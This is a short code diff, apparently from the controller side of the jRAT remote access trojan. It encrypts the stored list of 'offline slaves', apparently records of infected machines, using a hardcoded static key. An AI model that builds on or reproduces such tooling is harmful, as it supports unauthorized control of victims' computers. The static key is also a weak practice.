@@ -10,8 +10,14 @@ import java.io.OutputStreamWriter;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+
 import se.jrat.client.Globals;
 import se.jrat.client.OfflineSlave;
+import se.jrat.common.crypto.CryptoUtils;
+import se.jrat.common.crypto.KeyUtils;
 
 public class OfflineSlaves extends AbstractSettings {
 	
@@ -29,7 +35,8 @@ public class OfflineSlaves extends AbstractSettings {
 	
 	@Override
 	public void save() throws Exception {
-		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(getFile())));
+		CipherOutputStream cos = new CipherOutputStream(new FileOutputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, KeyUtils.STATIC_KEY));
+		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cos));
 		
 		for (OfflineSlave os : LIST) {
 			writer.write(OfflineSlave.toString(os));
@@ -43,7 +50,9 @@ public class OfflineSlaves extends AbstractSettings {
 	public void load() throws Exception {
 		LIST.clear();
 		
-		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(getFile())));
+		CipherInputStream cos = new CipherInputStream(new FileInputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, KeyUtils.STATIC_KEY));
+
+		BufferedReader reader = new BufferedReader(new InputStreamReader(cos));
 		
 		String line;
 		
